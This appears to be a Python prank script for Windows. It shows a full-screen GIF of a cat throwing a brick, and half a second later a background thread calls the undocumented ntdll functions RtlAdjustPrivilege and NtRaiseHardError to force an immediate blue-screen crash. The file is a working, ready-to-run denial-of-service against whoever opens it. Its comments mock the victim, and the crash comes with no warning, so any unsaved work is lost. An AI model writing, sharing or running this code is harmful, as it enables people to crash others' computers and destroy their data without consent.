from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
import time
import tkinter as tk
from PIL import Image, ImageTk
from itertools import count
import threading

def from_rgb(rgb):
    return "#%02x%02x%02x" % rgb

class ImageLabel(tk.Label):
    """a label that displays images, and plays them if they are gifs"""
    def load(self, im):
        if isinstance(im, str):
            im = Image.open(im)
        self.loc = 0
        self.frames = []

        try:
            for i in count(1):
                self.frames.append(ImageTk.PhotoImage(im.copy()))
                im.seek(i)
        except EOFError:
            pass

        try:
            self.delay = im.info['duration']
        except:
            self.delay = 100

        if len(self.frames) == 1:
            self.config(image=self.frames[0], bd=0, highlightthickness=0)
        else:
            self.next_frame()

    def unload(self):
        self.config(image="")
        self.frames = None

    def next_frame(self):
        if self.frames:
            self.loc += 1
            self.loc %= len(self.frames)
            self.config(image=self.frames[self.loc])
            self.after(self.delay, self.next_frame)

    def fullscreen(self, event=None):
        self.winfo_toplevel().attributes('-fullscreen', True)


def test():
    time.sleep(1)
    print("executing BSOD!")
    time.sleep(1)
    root.destroy()
    exit()

def start_threads():
    t2 = threading.Thread(target=BSOD)
    t2.start()

def center(window, label):
    label.pack(expand=True)
    label.place(relx=0.5, rely=0.5, anchor=tk.CENTER)


def BSOD():
    time.sleep(0.48)

    print("BYEBYE HAHAHHAHAHA")

    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19), 
        c_uint(1), 
        c_uint(0), 
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
    c_ulong(0xC000007B), 
    c_ulong(0), 
    nullptr, 
    nullptr, 
    c_uint(6), 
    byref(c_uint())
    )

    # pc shouldn't be alive for this but jic LMFAO
    time.sleep(1)
    root.destroy()
    exit()

root = tk.Tk()
lbl = ImageLabel(root, bd=0, highlightthickness=0, borderwidth=0)
def main():
    root.bind('<Escape>', lambda _: root.destroy())
    center(root, lbl)
    lbl.fullscreen()
    lbl.load('cat-throwing-brick-brick.gif')
    root.after(0, start_threads)
    root.configure(background=from_rgb((4,3,3)))
    root.mainloop()


if __name__ == '__main__':
    main()